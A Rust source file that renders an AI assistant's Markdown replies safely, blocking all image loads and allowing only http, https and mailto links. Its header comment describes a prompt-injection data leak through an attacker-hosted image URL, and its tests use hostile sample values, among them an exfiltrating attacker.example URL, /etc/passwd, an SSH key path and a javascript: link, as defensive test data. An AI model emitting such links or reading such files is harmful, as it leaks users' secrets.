//! Claude's replies as formatted Markdown, rendered safely.
//!
//! Agent output is untrusted: a prompt-injected reply can carry
//! `![](https://attacker/?data=…)`, which would leak data the moment the
//! image loads. So no document image ever loads from its URL, and only web
//! and mail links stay clickable; any other scheme (`file:`, `javascript:`,
//! app URLs) renders as plain text.

use gpui_kit::component::text::TextView;
use gpui_kit::{ElementId, ImageSource, Resource, SharedString, SharedUri};

/// An embedded asset that does not exist, so an image renders as a failed
/// load without touching the network or the file system.
const BLOCKED_IMAGE: &str = "agent-desk/blocked-image";

/// Markdown for one assistant message. `id` must be stable for the message.
pub fn assistant_markdown(id: impl Into<ElementId>, text: impl Into<SharedString>) -> TextView {
    TextView::markdown(id, text)
        .selectable(true)
        .image_source(blocked_image_source)
        .link(|link, _| is_openable_link(&link.url).then(|| link.clone()))
}

pub fn blocked_image_source(_uri: &SharedUri) -> ImageSource {
    ImageSource::Resource(Resource::Embedded(BLOCKED_IMAGE.into()))
}

/// Whether a link may open: `http`, `https` or `mailto`, by scheme.
pub fn is_openable_link(url: &str) -> bool {
    let Some((scheme, _)) = url.split_once(':') else {
        return false;
    };
    matches!(
        scheme.to_ascii_lowercase().as_str(),
        "http" | "https" | "mailto"
    )
}

#[cfg(test)]
mod tests {
    use gpui_kit::{ImageSource, Resource, SharedUri};

    use super::{blocked_image_source, is_openable_link};

    #[test]
    fn images_never_load_from_their_url() {
        for uri in [
            "https://attacker.example/pixel.png?d=secret",
            "file:///etc/passwd",
            "data:image/png;base64,AAAA",
        ] {
            let source = blocked_image_source(&SharedUri::from(uri));
            assert!(
                matches!(source, ImageSource::Resource(Resource::Embedded(_))),
                "{uri} must not resolve to a network or file source"
            );
        }
    }

    #[test]
    fn only_web_and_mail_links_open() {
        assert!(is_openable_link("https://docs.rs/gpui"));
        assert!(is_openable_link("HTTP://example.com"));
        assert!(is_openable_link("mailto:someone@example.com"));
        assert!(!is_openable_link("file:///home/user/.ssh/id_ed25519"));
        assert!(!is_openable_link("javascript:alert(1)"));
        assert!(!is_openable_link("vscode://open?path=/tmp"));
        assert!(!is_openable_link("relative/path.md"));
    }
}
